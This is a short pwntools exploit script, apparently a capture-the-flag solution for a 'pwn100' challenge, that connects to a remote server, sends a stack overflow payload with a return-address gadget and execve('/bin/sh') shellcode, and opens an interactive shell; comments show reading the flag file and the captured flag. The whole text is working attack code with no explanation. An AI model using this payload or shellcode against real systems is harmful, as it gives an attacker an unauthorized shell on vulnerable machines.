from pwn import *
context.arch='i386'
context.os='linux'
#r=process('./pwn100')
r=remote("54.67.102.66","5252")
shell="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
pay=asm('add esp,0x4;call esp')
pay+="A"*(28-len(pay))
pay+=p32(0x08048386)
pay+=shell
r.send(pay)
r.interactive()

#cat /home/pwn100/flag

#Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}
